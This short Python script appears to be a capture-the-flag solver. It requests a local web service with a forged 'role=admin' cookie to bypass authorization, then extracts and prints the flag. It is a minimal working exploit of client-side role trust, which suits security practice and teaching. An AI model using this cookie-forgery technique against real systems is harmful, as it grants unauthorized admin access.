#!/usr/bin/env python3
import requests

BASE = 'http://127.0.0.1:13392'
r = requests.get(BASE, cookies={'role': 'admin'})
if 'flag{' in r.text:
    import re
    flag = re.search(r'flag\{[^}]+\}', r.text).group()
    print(f'[+] {flag}')
else:
    print('[-] flag not found')
